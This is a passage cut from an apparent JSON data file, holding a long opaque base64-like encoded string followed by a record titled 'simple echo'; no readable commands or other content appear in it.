GtpIJR5eFFKwxps9wp4w/lRPQxx5dJPpLwagKJsEpraTZiZfSp0jSeNcdJdaWnbrvXbFRlmdzUs+kMpjJ11iKLGpk2XERngvQkmY8aQp4c0KoAUYkMChz/xkH2m783ER+z7yPvgCxwFt95paci0wRNCcNooqUjeHhGRh6tkYOZqPMsKeY6gmcTKWQWABm6qjjfzuZdh4UHF9KEVZYE49iIi6i7+bewnktERvxLeseeJG1TGs6UOCnw6EPHQ+uVbijmKWWWFhmfMgXV0k8obEf2f58qPkU8sweRCSs4Kci9tYAi07AYdSfEUmp34O8eRJLNrnOQ5QUCn0v2kFjRkf8qPRQeeXPHlmUq6VeniqiTZVfR1YkqkhMoXfDp4hWQklHRH/aIaR6WDlIO5HUmczeLTiPceK/8dXQb41W5NU5jx146+uWURDJmjLbL2oEeWR9XlmsS3DNIvlchQStiSEDS56FuRG5mtHE1lZYXnz12cRxMhs1uUBBkiZjZzeiUdP/oxVhe9Sen+8TZDV8rgDt4uuh/PwDXJZ83bafOqrKe+10XaB9enpYYAUezdI675IvGvxVI/91GLOU9LSqYN+CXJccs30vjPS8jP7eldO+hcTZrNz7TqXYuOSxQBwHeKHe0b1jvyig7bl2GsCjv3dLeneynoL5/jVYj9HhU0RDHTNzRNRdYMdPm4qjcCyF+gTiBCAanWk1SNjdwcqZk6qxgbRIqbjvcZemfIShD0ZWIX1Aq3JrpgE85cSYQ6NI2kzVbZIks+PgEiA2dTRAsgSXWJPz7THFaZr+E4/kYo1iix2iinb38+ULZ0jGV6i0DBrtB8FSzRSJntmRCzxqeWfU5Lm8/OAn6eejsqg0SsjU=;^","title":"simple echo"}]}